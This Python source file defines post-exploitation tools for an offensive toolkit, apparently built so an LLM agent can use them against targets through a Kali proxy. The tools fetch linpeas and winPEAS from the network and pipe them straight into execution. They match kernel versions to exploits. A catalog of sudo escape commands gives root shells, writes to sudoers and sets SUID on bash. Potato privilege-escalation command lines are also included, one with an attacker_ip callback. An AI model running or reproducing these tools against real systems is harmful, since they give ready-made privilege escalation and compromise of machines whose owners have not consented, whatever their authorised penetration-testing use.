"""MCP tools — post-exploitation primitives (enum, linpeas/winpeas, privesc heuristics)."""

from __future__ import annotations

import asyncio
import shlex
from typing import Any

from kestrel.mcp import registry
from kestrel.transport import kali_proxy


async def _run_kali(cmd: str, timeout: float = 300.0) -> dict[str, Any]:
    res = await asyncio.to_thread(kali_proxy.via_kali, cmd, timeout)
    return {"cmd": cmd, "rc": res.rc, "stdout": res.stdout, "stderr": res.stderr.strip(), "duration_s": res.duration_s}


# ── linpeas / winpeas via session ────────────────────────────────────────────


_LINPEAS_LOCAL_PATHS = [
    "/usr/share/peass-ng/linpeas.sh",
    "/usr/share/peass/linpeas.sh",
    "/opt/linpeas.sh",
    "/opt/PEASS-ng/linpeas.sh",
]


@registry.tool(
    name="post_linpeas_run",
    description=(
        "Download + run linpeas.sh on target (via session_exec proxy command). Returns top findings only. "
        "`exec_cmd_template` should contain {} where the command goes (e.g. SSH user@host 'bash -c ...'). "
        "Tries local Kali copy first (/usr/share/peass-ng/linpeas.sh), falls back to remote download."
    ),
    category="post",
)
async def post_linpeas_run(exec_cmd_template: str, linpeas_url: str = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh") -> dict[str, Any]:
    # Build the inner command: try local copy on Kali first, fallback to remote download
    local_check = " || ".join(f"[ -f {p} ] && cat {p}" for p in _LINPEAS_LOCAL_PATHS)
    inner = (
        f"( {local_check} || curl -ks {shlex.quote(linpeas_url)} ) | bash 2>&1 | tail -c 8000"
    )
    if "{}" in exec_cmd_template:
        cmd = exec_cmd_template.replace("{}", inner)
    else:
        cmd = f"{exec_cmd_template} {shlex.quote(inner)}"
    res = await _run_kali(cmd, timeout=900.0)
    # Pull out 'PE' (privesc) red lines heuristically
    interesting: list[str] = []
    for line in res["stdout"].splitlines():
        if "[+]" in line or "vuln" in line.lower() or "ROOT" in line:
            interesting.append(line.strip())
    return {"finding_count": len(interesting), "interesting": interesting[:50], "rc": res["rc"]}


@registry.tool(
    name="post_winpeas_run",
    description="Same as post_linpeas_run but for WinPEAS (Windows). Output captured + heuristic-filtered.",
    category="post",
)
async def post_winpeas_run(exec_cmd_template: str, winpeas_url: str = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe") -> dict[str, Any]:
    # Use base64 download trick for Windows
    inner = (
        f"$u='{winpeas_url}'; $tmp=[IO.Path]::GetTempFileName()+'.exe'; "
        f"Invoke-WebRequest $u -OutFile $tmp -UseBasicParsing; & $tmp"
    )
    if "{}" in exec_cmd_template:
        cmd = exec_cmd_template.replace("{}", inner)
    else:
        cmd = f"{exec_cmd_template} {shlex.quote(inner)}"
    res = await _run_kali(cmd, timeout=900.0)
    interesting = [ln for ln in res["stdout"].splitlines() if "[+]" in ln]
    return {"finding_count": len(interesting), "interesting": interesting[:50], "rc": res["rc"]}


# ── Quick enum (session-based via exec template) ─────────────────────────────


@registry.tool(
    name="post_enum_user",
    description="Quick user enum on target: id; whoami; groups; sudo -l (or whoami /priv on Windows).",
    category="post",
)
async def post_enum_user(exec_cmd_template: str, os: str = "linux") -> dict[str, Any]:
    if os.lower().startswith("win"):
        inner = "whoami; whoami /priv; whoami /groups"
    else:
        inner = "id; whoami; groups; sudo -n -l 2>&1"
    cmd = exec_cmd_template.replace("{}", inner) if "{}" in exec_cmd_template else f"{exec_cmd_template} {shlex.quote(inner)}"
    return await _run_kali(cmd, timeout=30.0)


@registry.tool(
    name="post_enum_system",
    description="Quick system enum: uname/lsb_release/uptime (Linux) or systeminfo (Windows).",
    category="post",
)
async def post_enum_system(exec_cmd_template: str, os: str = "linux") -> dict[str, Any]:
    if os.lower().startswith("win"):
        inner = "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Build\""
    else:
        inner = "uname -a; cat /etc/os-release 2>/dev/null; uptime"
    cmd = exec_cmd_template.replace("{}", inner) if "{}" in exec_cmd_template else f"{exec_cmd_template} {shlex.quote(inner)}"
    return await _run_kali(cmd, timeout=30.0)


# ── privesc heuristics ──────────────────────────────────────────────────────


KERNEL_HINTS: list[dict[str, Any]] = [
    {"pattern": "2.6.32", "candidate": "Dirty COW (CVE-2016-5195)", "edb": "40847"},
    {"pattern": "2.6.39", "candidate": "Dirty COW (CVE-2016-5195)", "edb": "40847"},
    {"pattern": "3.13", "candidate": "OverlayFS (CVE-2015-1328)", "edb": "37292"},
    {"pattern": "3.14", "candidate": "Dirty COW (CVE-2016-5195)", "edb": "40847"},
    {"pattern": "4.4.0", "candidate": "DCCP double-free (CVE-2017-6074)", "edb": "41458"},
    {"pattern": "4.15.", "candidate": "Dirty COW (CVE-2016-5195) / OverlayFS", "edb": "40847"},
    {"pattern": "5.4.", "candidate": "DirtyPipe if 5.4.x-5.8: CVE-2022-0847", "edb": "50808"},
    {"pattern": "5.8.", "candidate": "DirtyPipe (CVE-2022-0847) / PwnKit (CVE-2021-4034)", "edb": "50808"},
    {"pattern": "5.10.", "candidate": "DirtyPipe (CVE-2022-0847) — check if <5.10.102", "edb": "50808"},
    {"pattern": "5.15.", "candidate": "PwnKit (CVE-2021-4034) via pkexec", "edb": "50689"},
    {"pattern": "5.16.", "candidate": "PwnKit (CVE-2021-4034) via pkexec", "edb": "50689"},
]


@registry.tool(
    name="post_privesc_kernel",
    description="Match `kernel_version` against known kernel exploits (Dirty COW, OverlayFS, PwnKit, etc.).",
    category="post",
)
async def post_privesc_kernel(kernel_version: str) -> dict[str, Any]:
    matches = [h for h in KERNEL_HINTS if h["pattern"] in kernel_version]
    return {"kernel_version": kernel_version, "candidate_count": len(matches), "candidates": matches}


SUDO_GTFOBINS = {
    "vim": "sudo vim -c ':!/bin/sh'",
    "vi": "sudo vi -c ':!/bin/sh'",
    "nano": "sudo nano  # ^R^X then: reset; sh 1>&0 2>&0",
    "less": "sudo less /etc/hostname  # then !/bin/sh",
    "more": "sudo more /etc/hostname  # then !/bin/sh",
    "man": "sudo man man  # then !/bin/sh",
    "find": "sudo find . -exec /bin/sh \\;",
    "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
    "python3": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    "perl": "sudo perl -e 'exec \"/bin/sh\";'",
    "ruby": "sudo ruby -e 'exec \"/bin/sh\"'",
    "lua": "sudo lua -e 'os.execute(\"/bin/sh\")'",
    "php": "sudo php -r 'system(\"/bin/sh\");'",
    "node": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
    "bash": "sudo bash",
    "sh": "sudo sh",
    "env": "sudo env /bin/sh",
    "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "wget": "(read-only — no direct shell; abuse via --post-file or to overwrite authorized_keys)",
    "curl": "(read-only — no direct shell; abuse to write files via -o)",
    "rsync": "sudo rsync -e 'sh -c \"sh -i 0<&2 1>&2\"' 127.0.0.1:/dev/null /dev/null",
    "nmap": "echo 'os.execute(\"/bin/sh\")' > /tmp/n.nse && sudo nmap --script=/tmp/n.nse",
    "git": "sudo git -p help config  # then !/bin/sh",
    "ftp": "sudo ftp  # then !/bin/sh",
    "tee": "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/evil",
    "cp": "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p",
    "dd": "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo dd of=/etc/sudoers.d/evil",
    "chmod": "sudo chmod +s /bin/bash && /bin/bash -p",
    "chown": "sudo chown $(id -un):$(id -gn) /etc/shadow",
    "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "zip": "TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T --unzip-command='sh -c /bin/sh'",
    "pkexec": "sudo pkexec /bin/sh  # also test CVE-2021-4034 PwnKit",
    "socat": "sudo socat stdin exec:/bin/sh",
    "strace": "sudo strace -o /dev/null /bin/sh",
}


@registry.tool(
    name="post_privesc_sudo",
    description=(
        "Parse the output of `sudo -l` and match binaries against the gtfobins escape catalog. "
        "Returns matches with copy-paste-ready PoC commands."
    ),
    category="post",
)
async def post_privesc_sudo(sudo_l_output: str) -> dict[str, Any]:
    out_lower = sudo_l_output.lower()
    matches: list[dict[str, Any]] = []
    for binary, poc in SUDO_GTFOBINS.items():
        # Word-boundary-ish: look for "/binary" or " binary " patterns
        if f"/{binary}" in out_lower or f" {binary} " in out_lower or out_lower.strip().endswith(binary):
            matches.append({"binary": binary, "poc": poc})
    return {"match_count": len(matches), "matches": matches}


@registry.tool(
    name="post_check_token",
    description=(
        "Parse Windows `whoami /priv` output, flag exploitable privileges (SeImpersonate, SeAssign, etc.) "
        "and suggest Potato/PrintNightmare/etc."
    ),
    category="post",
)
async def post_check_token(whoami_priv_output: str) -> dict[str, Any]:
    out = whoami_priv_output.lower()
    hits: list[dict[str, Any]] = []
    if "seimpersonateprivilege" in out and "enabled" in out:
        hits.append({"privilege": "SeImpersonatePrivilege", "exploit": "JuicyPotato / RoguePotato / GodPotato"})
    if "seassignprimarytoken" in out and "enabled" in out:
        hits.append({"privilege": "SeAssignPrimaryTokenPrivilege", "exploit": "Token impersonation"})
    if "sebackupprivilege" in out and "enabled" in out:
        hits.append({"privilege": "SeBackupPrivilege", "exploit": "Read SAM/SYSTEM hives"})
    if "serestoreprivilege" in out and "enabled" in out:
        hits.append({"privilege": "SeRestorePrivilege", "exploit": "Replace system binaries"})
    if "sedebugprivilege" in out and "enabled" in out:
        hits.append({"privilege": "SeDebugPrivilege", "exploit": "Dump LSASS / inject into protected processes"})
    return {"exploitable_count": len(hits), "exploitable": hits}


@registry.tool(
    name="post_check_disk",
    description=(
        "Check disk space on target via exec_cmd_template. "
        "Returns parsed free_pct for each mount. Flags mounts with <10% free as low_space."
    ),
    category="post",
)
async def post_check_disk(exec_cmd_template: str, os: str = "linux") -> dict[str, Any]:
    if os.lower().startswith("win"):
        inner = "Get-PSDrive -PSProvider FileSystem | Select-Object Name,Used,Free"
    else:
        inner = "df -h 2>/dev/null"
    cmd = exec_cmd_template.replace("{}", inner) if "{}" in exec_cmd_template else f"{exec_cmd_template} {shlex.quote(inner)}"
    res = await _run_kali(cmd, timeout=15.0)
    mounts: list[dict[str, Any]] = []
    low_space: list[str] = []
    for line in res["stdout"].splitlines()[1:]:  # skip header
        parts = line.split()
        if len(parts) >= 6:
            use_pct_str = parts[4].rstrip("%")
            try:
                use_pct = int(use_pct_str)
                free_pct = 100 - use_pct
                mount = {"mount": parts[5], "size": parts[1], "used": parts[2], "avail": parts[3], "use_pct": use_pct, "free_pct": free_pct}
                mounts.append(mount)
                if free_pct < 10:
                    low_space.append(parts[5])
            except (ValueError, IndexError):
                continue
    return {"rc": res["rc"], "mounts": mounts, "low_space_mounts": low_space, "raw": res["stdout"]}


@registry.tool(
    name="post_privesc_potato",
    description=(
        "Suggest the right Potato variant based on Windows build + privilege. variant is informational; "
        "this tool returns a copy-paste exec line (the actual binary deploy is up to the LLM/user)."
    ),
    category="post",
)
async def post_privesc_potato(windows_build: str, variant: str = "auto") -> dict[str, Any]:
    build = windows_build.lower()
    if variant == "auto":
        if "windows server 2008" in build or "windows 7" in build:
            variant = "JuicyPotato"
        elif "windows server 2012" in build or "windows 8" in build or "windows server 2016" in build:
            variant = "RoguePotato"
        elif "windows server 2019" in build or "windows 10" in build or "windows 11" in build or "windows server 2022" in build:
            variant = "GodPotato"
        else:
            variant = "RoguePotato"
    cmd_template = {
        "JuicyPotato": "JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c whoami > c:\\\\temp\\\\out.txt\" -t *",
        "RoguePotato": "RoguePotato.exe -r <attacker_ip> -e cmd.exe -l 9999",
        "GodPotato": "GodPotato.exe -cmd \"cmd /c whoami\"",
    }
    return {"variant": variant, "windows_build": windows_build, "cmd_template": cmd_template.get(variant)}
